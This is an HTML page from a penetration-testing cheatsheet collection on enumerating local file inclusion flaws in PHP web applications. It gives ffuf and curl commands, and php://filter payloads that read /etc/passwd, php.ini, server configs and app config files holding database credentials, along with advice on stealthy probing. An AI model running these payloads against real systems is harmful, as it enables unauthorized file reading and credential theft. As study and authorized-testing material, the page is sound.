@@ -1,0 +1,267 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Enumeration · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Web › File Inclusion</nav><h1>Enumeration</h1><p class="cx-lede">Finding LFI parameters, the webroot path, log file locations, and other server-specific paths needed to chain LFI into deeper exploitation.</p><div class="cx-tags"><span class="cx-tag">MITRE T1190, T1083</span><span class="cx-tag">D3FEND D3-FA</span><span class="cx-tag">IMPACT FileRead</span><span class="cx-tag">OWASP A05</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>Three enumeration phases for LFI work:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># 1. Find vulnerable parameters (often unlinked from HTML forms)
+ffuf -w params.txt:FUZZ -u &#x27;https://target/index.php?FUZZ=test&#x27; -fs &lt;baseline_size&gt;
+
+# 2. Find the webroot (for absolute-path inclusions and locating uploaded files)
+ffuf -w webroot-paths.txt:FUZZ -u &#x27;https://target/?page=../../../FUZZ/index.php&#x27; -fs &lt;baseline&gt;
+
+# 3. Find logs and config (for log poisoning and server fingerprinting)
+ffuf -w lfi-wordlist.txt:FUZZ -u &#x27;https://target/?page=../../../FUZZ&#x27; -fs &lt;baseline&gt;</code></pre></figure>
+<p>Success indicator: response size changes when the fuzzer hits a valid parameter, file path, or directory.</p>
+<h2 id="phase-1-finding-the-vulnerable-parameter">Phase 1 - Finding the vulnerable parameter</h2>
+<p>LFI hides in parameters that aren't linked from forms. HTML-form parameters tend to be tested better; "internal" / "leftover" parameters often aren't.</p>
+<h3 id="common-lfi-shaped-parameter-names">Common LFI-shaped parameter names</h3>
+<figure class="cx-code"><figcaption></figcaption><pre><code>page          file           path          template
+include       view           document      content
+load          read           inc           src
+folder        item           pg            cat
+language      lang           locale        country
+theme         style          skin          layout
+display       show           render        partial</code></pre></figure>
+<h3 id="fuzzing-with-ffuf">Fuzzing with ffuf</h3>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Baseline - get response size for an invalid parameter value
+curl -s &#x27;https://target/index.php?nonexistent=test&#x27; | wc -c
+# → 2287
+
+ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
+     -u &#x27;https://target/index.php?FUZZ=test&#x27; \
+     -fs 2287</code></pre></figure>
+<p>The <code>-fs 2287</code> filter excludes responses matching the baseline size - anything different is a candidate. Adjust the size to match your target.</p>
+<p>When the baseline varies request-to-request (e.g., due to a session-id or timestamp in the response), filter by status or word count instead:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Filter by exact word count
+-fw 145
+
+# Filter by line count
+-fl 64
+
+# Match specific status codes
+-mc 200,500</code></pre></figure>
+<h3 id="hits-dont-guarantee-lfi">Hits don't guarantee LFI</h3>
+<p>A parameter affecting the response means it's <em>used</em> - not that it's <em>vulnerable</em>. Confirm each hit:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># For each interesting parameter
+for param in language theme view file; do
+    curl -s &quot;https://target/index.php?$param=/etc/passwd&quot; | head -c 200
+    echo &quot;---&quot;
+done</code></pre></figure>
+<p>A response containing <code>root:x:0:0:...</code> confirms LFI on that parameter.</p>
+<h3 id="beyond-get-parameters">Beyond GET parameters</h3>
+<p>Don't limit to GET. Test:</p>
+<ul>
+<li><strong>POST parameters</strong> - same names, sent as form data</li>
+<li><strong>JSON body keys</strong> - <code>{"page": "/etc/passwd"}</code></li>
+<li><strong>HTTP headers</strong> - <code>X-Original-URL</code>, <code>X-Forwarded-Path</code>, <code>Referer</code>, custom app-specific headers</li>
+<li><strong>Cookies</strong> - sometimes used as templating selectors</li>
+</ul>
+<p>Sample header test:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">ffuf -w common-headers.txt:HEADER \
+     -u &#x27;https://target/&#x27; \
+     -H &quot;HEADER: /etc/passwd&quot; \
+     -mr &quot;root:x:0:0&quot;</code></pre></figure>
+<h2 id="phase-2-finding-the-webroot">Phase 2 - Finding the webroot</h2>
+<p>Knowing the webroot path is essential for:</p>
+<ul>
+<li><strong>Reading the source of files you found</strong> by URL but don't know the on-disk path of</li>
+<li><strong>Locating uploaded files</strong> when the URL doesn't map cleanly to disk</li>
+<li><strong>Constructing absolute paths</strong> when relative paths are blocked</li>
+</ul>
+<h3 id="common-webroot-paths">Common webroot paths</h3>
+<p>Linux:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>/var/www/html/
+/var/www/
+/srv/www/
+/srv/http/
+/usr/share/nginx/html/
+/usr/local/apache2/htdocs/
+/opt/lampp/htdocs/
+/home/&lt;user&gt;/public_html/</code></pre></figure>
+<p>Windows:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>C:\inetpub\wwwroot\
+C:\xampp\htdocs\
+C:\wamp\www\
+C:\Apache24\htdocs\</code></pre></figure>
+<h3 id="fuzzing-for-the-webroot">Fuzzing for the webroot</h3>
+<p>The trick: fuzz the path, looking for the application's own <code>index.php</code>. When the LFI sink can load <code>&lt;webroot&gt;/index.php</code>, you've found the webroot:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ \
+     -u &#x27;https://target/?page=../../../../FUZZ/index.php&#x27; \
+     -fs 2287</code></pre></figure>
+<p>Adjust the leading <code>../../../</code> count to your knowledge of the LFI depth. When it hits, you'll see the webroot reflected:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>/var/www/html/          [Status: 200, Size: ..., Words: ..., Lines: ...]</code></pre></figure>
+<h3 id="from-server-config">From server config</h3>
+<p>If <code>php://filter</code> works, read the server config directly:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?page=php://filter/convert.base64-encode/resource=/etc/apache2/apache2.conf
+?page=php://filter/convert.base64-encode/resource=/etc/nginx/nginx.conf</code></pre></figure>
+<p>Look for <code>DocumentRoot</code> (Apache) or <code>root</code> (Nginx):</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>DocumentRoot /var/www/html</code></pre></figure>
+<p>or</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>server {
+    listen 80;
+    root /var/www/html;
+}</code></pre></figure>
+<p>The config also reveals the log paths and other useful settings - usually the fastest enumeration path when accessible.</p>
+<h3 id="from-error-messages">From error messages</h3>
+<p>Verbose PHP errors often include the full path:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>Warning: include(/var/www/html/languages/../etc/passwd): failed to open stream: 
+No such file or directory in /var/www/html/index.php on line 12</code></pre></figure>
+<p>The <code>in /var/www/html/index.php</code> reveals the webroot.</p>
+<h3 id="apache-environment-variables">Apache environment variables</h3>
+<p>When the Apache config uses variables (<code>APACHE_LOG_DIR</code>), read <code>envvars</code>:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?page=php://filter/convert.base64-encode/resource=/etc/apache2/envvars</code></pre></figure>
+<figure class="cx-code"><figcaption></figcaption><pre><code>export APACHE_LOG_DIR=/var/log/apache2
+export APACHE_RUN_USER=www-data
+export APACHE_PID_FILE=/var/run/apache2.pid</code></pre></figure>
+<h2 id="phase-3-finding-logs-and-config">Phase 3 - Finding logs and config</h2>
+<p>For <a href="../log-poisoning/index.html">log poisoning</a> and detailed server fingerprinting, you need the log paths.</p>
+<h3 id="lfi-specific-wordlists">LFI-specific wordlists</h3>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Comprehensive LFI wordlist with traversal payloads + common files
+/opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt
+
+# Linux-specific file paths
+# https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux
+
+# Windows-specific
+# https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows</code></pre></figure>
+<p>Usage:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
+     -u &#x27;https://target/?page=FUZZ&#x27; \
+     -fs 2287</code></pre></figure>
+<p>The Jhaddix list contains both payloads (traversal variants) and target file paths (<code>/etc/passwd</code>, <code>/etc/shadow</code>, etc.). Useful for one-shot scanning.</p>
+<h3 id="targeted-log-discovery">Targeted log discovery</h3>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">ffuf -w lfi-wordlist-linux.txt:FUZZ \
+     -u &#x27;https://target/?page=../../../../FUZZ&#x27; \
+     -fs 2287</code></pre></figure>
+<p>Common interesting files this finds:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>/etc/hosts
+/etc/hostname
+/etc/issue
+/etc/passwd
+/etc/group
+/etc/crontab
+/etc/sudoers
+/etc/apache2/apache2.conf
+/etc/apache2/sites-enabled/000-default.conf
+/etc/apache2/envvars
+/etc/nginx/nginx.conf
+/etc/nginx/sites-enabled/default
+/etc/php/7.4/apache2/php.ini
+/etc/php/8.1/fpm/php.ini
+/var/log/apache2/access.log
+/var/log/apache2/error.log
+/var/log/nginx/access.log
+/var/log/nginx/error.log
+/var/log/auth.log
+/var/log/mail.log
+/var/log/syslog
+/var/log/dpkg.log
+/proc/self/cmdline
+/proc/self/environ
+/proc/self/status
+/proc/version</code></pre></figure>
+<h3 id="fingerprinting-the-os-server-software">Fingerprinting the OS / server software</h3>
+<p>A few high-information probes:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?page=/etc/os-release                        # Linux distribution
+?page=/etc/issue                             # Login banner with OS version
+?page=/proc/version                          # Kernel version
+?page=/etc/passwd                            # Linux users
+?page=/etc/group                             # Linux groups (reveals service users)
+?page=C:/Windows/win.ini                     # Confirms Windows
+?page=C:/Windows/System32/drivers/etc/hosts  # Windows hosts file</code></pre></figure>
+<p>The combination quickly identifies the platform. Once OS-known, narrow the rest of enumeration to OS-specific paths.</p>
+<h3 id="web-app-footprinting">Web app footprinting</h3>
+<p>Reading the index page source via <code>php://filter</code>:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?page=php://filter/convert.base64-encode/resource=index</code></pre></figure>
+<p>Parse the decoded source for:</p>
+<ul>
+<li><code>include</code>/<code>require</code> references → other PHP files to read</li>
+<li>Database connection strings → DB credentials</li>
+<li>API endpoints → other attack surface</li>
+<li>Hardcoded paths → upload directories, log paths</li>
+<li>Version comments → framework version for CVE lookup</li>
+</ul>
+<p>A few minutes reading the source typically yields enough information to skip the rest of enumeration and head straight for the exploit.</p>
+<h2 id="automated-lfi-tools">Automated LFI tools</h2>
+<p>A few tools attempt to automate the LFI workflow end-to-end:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>LFISuite     https://github.com/D35m0nd142/LFISuite
+LFiFreak     https://github.com/OsandaMalith/LFiFreak
+liffy        https://github.com/mzfr/liffy</code></pre></figure>
+<p>These tools:
+- Test parameters against common payloads
+- Detect traversal depth automatically
+- Try wrappers (<code>data://</code>, <code>php://filter</code>) when basic LFI works
+- Sometimes drop a shell automatically</p>
+<p><strong>Quality varies and most are Python 2 / unmaintained.</strong> They miss filter-bypass scenarios that manual testing catches. Useful as a "scan-first" quick check; not a replacement for manual testing.</p>
+<h3 id="when-automated-tools-help">When automated tools help</h3>
+<ul>
+<li><strong>Coverage check on many parameters at once</strong> - quickly confirms whether anything is trivially vulnerable</li>
+<li><strong>First-pass scanning during reconnaissance</strong> - produces a list of candidate parameters to investigate manually</li>
+<li><strong>Lab / CTF environments</strong> - known-vulnerable targets where the automation does work</li>
+</ul>
+<h3 id="when-manual-is-required">When manual is required</h3>
+<ul>
+<li><strong>Filtered or partially-protected applications</strong> - automated tools have fixed payload sets that don't adapt</li>
+<li><strong>Non-standard parameter names</strong> - tools test obvious names; unusual ones get missed</li>
+<li><strong>Multi-step second-order LFI</strong> - automation can't chain across registration → trigger flows</li>
+</ul>
+<h2 id="practical-workflow">Practical workflow</h2>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># 1. Parameter fuzzing - find the sink
+ffuf -w params.txt:FUZZ -u &#x27;https://target/index.php?FUZZ=test&#x27; -fs &lt;baseline&gt;
+
+# 2. Confirm LFI on each candidate
+for p in $candidates; do
+    response=$(curl -s &quot;https://target/index.php?$p=/etc/passwd&quot;)
+    echo &quot;$p: $(echo &quot;$response&quot; | grep -c &#x27;root:x:0:0&#x27;)&quot;
+done
+
+# 3. OS and server fingerprint
+curl -s &quot;https://target/index.php?page=/etc/os-release&quot;
+curl -s &quot;https://target/index.php?page=/proc/version&quot;
+
+# 4. Read PHP config - answers many questions in one shot
+curl -s &quot;https://target/index.php?page=php://filter/convert.base64-encode/resource=/etc/php/7.4/apache2/php.ini&quot; \
+    | grep -oE &#x27;[A-Za-z0-9+/=]{200,}&#x27; | base64 -d \
+    | grep -E &#x27;^(allow_url_include|allow_url_fopen|disable_functions|extension|open_basedir)&#x27;
+
+# 5. Read web app config
+curl -s &quot;https://target/index.php?page=php://filter/convert.base64-encode/resource=config&quot; \
+    | grep -oE &#x27;[A-Za-z0-9+/=]{200,}&#x27; | base64 -d
+
+# 6. Pivot based on what&#x27;s available
+# - Wrappers? → see /codex/web/lfi/wrappers/
+# - Uploads + LFI? → see /codex/web/lfi/file-upload-chain/
+# - Readable logs? → see /codex/web/lfi/log-poisoning/
+# - Remote URL inclusion? → see /codex/web/lfi/rfi/</code></pre></figure>
+<h2 id="top-25-lfi-parameter-names">Top-25 LFI parameter names</h2>
+<p>Based on prevalence across vulnerable applications:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>page          file          path          include
+view          item          src           type
+folder        require       inc           document
+template      php_path      doc           pg
+content       url           load          read
+data          conf          dir           link</code></pre></figure>
+<p>A focused initial scan on these 25 typically finds the vulnerable parameter within seconds when one exists.</p>
+<h2 id="detection-only-enumeration">Detection-only enumeration</h2>
+<p>When stealth matters, probe sparingly:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># One-shot probe of the most likely candidates
+for p in page file path view template lang language; do
+    curl -s -o /dev/null -w &quot;$p: %{http_code} %{size_download}\n&quot; \
+         &quot;https://target/index.php?$p=/etc/passwd&quot;
+done</code></pre></figure>
+<p>Compare response sizes - the one returning a noticeably larger or different-sized response is the candidate. Then commit to a single confirmation request rather than mass-fuzzing.</p>
+<h2 id="notes">Notes</h2>
+<ul>
+<li><strong>Baseline-size filtering depends on stable responses.</strong> When response sizes vary naturally (rotating ads, timestamps, session IDs), <code>-fs</code> is unreliable. Switch to line/word count or regex match.</li>
+<li><strong><code>php://filter</code> accelerates everything else.</strong> Once you can read source, you discover most other paths without further fuzzing. Read the PHP config, web server config, and app <code>config.php</code> first - they tell you what you need.</li>
+<li><strong>The webroot fuzz works best with a known relative depth.</strong> When you've inferred the LFI depth from an error message, set the leading <code>../</code> count exactly and the webroot fuzz returns a single clean hit. Generic excess <code>../</code> (8-10) works but produces noisier results.</li>
+<li><strong>OS detection narrows the scope by 50%.</strong> Don't fuzz Linux paths against a Windows target - they all return identical empty responses, polluting the result set.</li>
+</ul>
+<div class="cx-aside cx-tip">
+<p class="cx-aside-title">Tip</p>
+<p>The single highest-value enumeration step on any PHP LFI: read <code>php.ini</code> via <code>php://filter</code>. The PHP configuration file tells you whether wrappers work, whether RFI is open, which extensions are loaded, where logs go, and what's restricted. One request, dozens of answers.</p>
+</div></article><nav class="cx-pager"><a class="cx-prev" href="../log-poisoning/index.html">Previous: Log poisoning</a><a class="cx-next" href="../defense/index.html">Next: Defending Against File Inclusion</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
